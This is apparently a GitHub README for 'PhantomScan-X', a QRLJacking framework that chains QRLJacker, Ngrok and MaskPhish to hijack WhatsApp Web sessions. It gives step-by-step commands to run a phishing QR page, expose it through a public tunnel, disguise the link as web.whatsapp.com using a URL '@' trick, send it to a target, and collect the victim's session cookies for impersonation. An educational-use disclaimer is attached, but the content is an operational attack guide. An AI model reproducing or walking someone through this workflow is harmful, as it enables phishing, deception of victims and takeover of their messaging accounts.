# 🕵️ PhantomScan-X

> **A QRLJacking Attack Framework with URL Masking & Ngrok Tunneling**
>
> Developed by **Mohamed Abdelhameed** | For Educational & CTF Purposes Only

---

## ⚠️ Legal Disclaimer

> This tool is provided **strictly for educational purposes**, authorized penetration testing, and academic research (e.g., college assignments, CTF challenges). The author does **not** condone illegal, unauthorized, or malicious use of this framework. Any use outside lawful, authorized testing environments is solely the responsibility of the user.

---

## 📖 Overview

**PhantomScan-X** is a combined attack framework that chains three powerful tools together to perform a complete **QRLJacking** attack:

| Component | Role |
|-----------|------|
| **QRLJacker** | Generates a malicious QR code page that hijacks a victim's QR-based session (e.g., WhatsApp Web) |
| **Ngrok** | Creates a secure public tunnel to expose the local QRLJacker server to the internet |
| **MaskPhish** | Disguises the Ngrok URL behind a trusted-looking domain to trick the victim |

### Attack Flow

```
[QRLJacker Local Server] → [Ngrok Public Tunnel] → [MaskPhish Disguised URL] → [Victim]
         ↑                                                                           |
         └───────────── Session Cookie Hijack (QR Scan) ────────────────────────────┘
```

---

## 📁 Project Structure

```
PhantomScan-X/
├── QRLJacker/                  # QRLJacking attack engine
│   ├── QrlJacker.py            # Main entry point (CLI)
│   ├── requirements.txt        # Python dependencies
│   ├── core/
│   │   ├── Cli.py              # Interactive command-line interface
│   │   ├── browser.py          # Selenium browser automation
│   │   ├── modules/
│   │   │   ├── grabber/
│   │   │   │   └── whatsapp.py # WhatsApp QRLJacking module
│   │   │   └── post/           # Post-exploitation modules
│   │   ├── templates/          # Phishing page HTML templates
│   │   └── www/                # Web server static files
│   └── sessions/               # Captured session data
│
└── maskphish/                  # URL masking tool
    └── maskphish.sh            # Bash script for URL disguising
```

---

## 🛠️ Requirements

### System Requirements

- **OS**: Linux (Ubuntu/Debian recommended) or macOS
- **Python**: 3.7 or above
- **Browser**: Mozilla Firefox
- **Geckodriver**: Included in `QRLJacker/` directory

### Python Dependencies

```
terminaltables>=3.1.0
selenium==3.141.0
urllib3==1.26.15
requests==2.28.2
Pillow>=5.4.1
Jinja2>=2.10
user-agent>=0.1.9
pathlib2>=2.3.5
```

### External Tools Required

| Tool | Installation |
|------|-------------|
| **curl** | `sudo apt install curl` |
| **ngrok** | See [Ngrok Setup](#-ngrok-setup--integration) section below |
| **Firefox** | `sudo apt install firefox` |

---

## 🚀 Installation

### 1. Clone the Repository

```bash
git clone https://github.com/yourrepo/PhantomScan-X.git
cd PhantomScan-X
```

### 2. Install QRLJacker Dependencies

```bash
cd QRLJacker
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 3. Make MaskPhish Executable

```bash
chmod +x maskphish/maskphish.sh
```

---

## 🌐 Ngrok Setup & Integration

Ngrok creates a **secure, public HTTPS tunnel** to your local QRLJacker server so victims on any network can reach your phishing page.

### Step 1: Install Ngrok

```bash
# Download Ngrok
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null

echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list

sudo apt update && sudo apt install ngrok
```

Or manually download from [https://ngrok.com/download](https://ngrok.com/download):

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

### Step 2: Authenticate Ngrok

Create a free account at [https://dashboard.ngrok.com](https://dashboard.ngrok.com), then copy your auth token and run:

```bash
ngrok config add-authtoken <YOUR_AUTH_TOKEN>
```

### Step 3: Start QRLJacker

Open **Terminal 1** and start the QRLJacker server:

```bash
cd PhantomScan-X/QRLJacker
source venv/bin/activate
python3 QrlJacker.py
```

Inside the QRLJacker CLI, configure and launch the module:

```
> use grabber/whatsapp
> set port 8080
> run
```

> QRLJacker will now be serving the phishing page on `http://localhost:8080`

### Step 4: Start Ngrok Tunnel

Open **Terminal 2** and tunnel the local port:

```bash
ngrok http 8080
```

Ngrok will display output like:

```
Session Status    online
Account           Mohamed Abdelhameed (Plan: Free)
Forwarding        https://a1b2c3d4.ngrok-free.app -> http://localhost:8080
```

> 📋 **Copy the `https://` Ngrok URL** — you will use this in the next step.

### Step 5: Mask the Ngrok URL with MaskPhish

Open **Terminal 3** and run:

```bash
cd PhantomScan-X/maskphish
bash maskphish.sh
```

You will be prompted for the following:

```
Paste Phishing URL here (with http or https):
> https://a1b2c3d4.ngrok-free.app

Domain to mask the Phishing URL (with http or https):
> https://web.whatsapp.com

Type social engineering words:
> whatsapp-qr-login
```

MaskPhish will output a disguised URL like:

```
https://web.whatsapp.com-whatsapp-qr-login@is.gd/XXXXXXX
```

> 🎯 **Send this final URL to the target.** When they click it, their browser resolves the real Ngrok address, loading your fake QR page.

---

## 🎯 Complete Attack Walkthrough

| Step | Action | Tool |
|------|--------|------|
| 1 | Start local phishing server on port 8080 | QRLJacker |
| 2 | Expose server to internet via HTTPS tunnel | Ngrok |
| 3 | Shorten & disguise the Ngrok URL | MaskPhish |
| 4 | Deliver the masked URL to the victim | Social Engineering |
| 5 | Victim scans the QR code displayed | Target's Phone |
| 6 | Session cookie captured in `QRLJacker/sessions/` | QRLJacker |

---

## 🖥️ QRLJacker CLI Reference

```bash
python3 QrlJacker.py [OPTIONS]
```

| Option | Description |
|--------|-------------|
| `-r <file>` | Execute commands from a resource/history file |
| `-x <cmd>` | Execute a specific command (use `;` for multiple) |
| `--debug` | Enable debug mode for easier problem identification |
| `--dev` | Enable development mode (reload modules on each use) |
| `--verbose` | Enable verbose mode (display extra details) |
| `-q` | Quiet mode — suppress the banner |

### Common CLI Commands (inside QRLJacker prompt)

```
> help                     # Show all available commands
> show modules             # List all available attack modules
> use grabber/whatsapp     # Load the WhatsApp grabber module
> show options             # Show current module settings
> set port 8080            # Set the server port
> set host 0.0.0.0        # Bind to all interfaces
> run                      # Start the attack module
> sessions                 # View captured sessions
> exit                     # Exit the framework
```

---

## 🐚 MaskPhish Reference

```bash
bash maskphish/maskphish.sh
```

**How it works:**

1. Takes your raw Ngrok/phishing URL
2. Shortens it using the [is.gd](https://is.gd) URL shortener API
3. Prepends a trusted-looking domain (e.g., `https://web.whatsapp.com`) before an `@` sign
4. Optionally adds social engineering keywords as a subdomain-like prefix

**Output format:**

- Without keywords: `https://trusted-domain.com@is.gd/SHORTCODE`
- With keywords: `https://trusted-domain.com-keywords@is.gd/SHORTCODE`

> ⚠️ In most browsers, everything before the `@` symbol in a URL is treated as credentials, not the actual hostname. The real destination is after `@`. This is the core deception trick.

---

## 🔒 Captured Sessions

After a successful attack, captured session data is stored in:

```
QRLJacker/sessions/
```

Session files contain the victim's authentication cookies/tokens which can then be used to impersonate the victim's account.

---

## 🧩 Supported Modules

| Module Path | Target Service | Description |
|-------------|---------------|-------------|
| `grabber/whatsapp` | WhatsApp Web | Hijacks WhatsApp Web session via QR code |

> More modules can be added under `QRLJacker/core/modules/grabber/` following the existing module structure.

---

## 🔧 Troubleshooting

| Problem | Solution |
|---------|----------|
| `geckodriver` not found | Ensure geckodriver is extracted: `tar -xvzf geckodriver-v0.36.0-linux64.tar.gz` inside QRLJacker/ |
| Firefox not launching | Install Firefox: `sudo apt install firefox` |
| `selenium` import error | Activate venv: `source venv/bin/activate` |
| Ngrok tunnel not working | Verify auth token: `ngrok config check` |
| MaskPhish gives invalid URL | Ensure URL starts with `http://` or `https://` |
| `is.gd` shortener fails | Check internet connection; `curl` must be installed |
| Port 8080 in use | Change port in QRLJacker: `set port 9090`, update ngrok command accordingly |

---

## 📚 References & Credits

- **MaskPhish** — URL masking technique by KP
- **Ngrok** — Secure tunneling by [ngrok.com](https://ngrok.com)
- **is.gd** — URL shortener used by MaskPhish

---

## 👤 Author

**Mohamed Abdelhameed**
Security Researcher & Penetration Testing Student

> *"Knowledge is power — use it responsibly."*

---

*PhantomScan-X — For educational and authorized use only.*
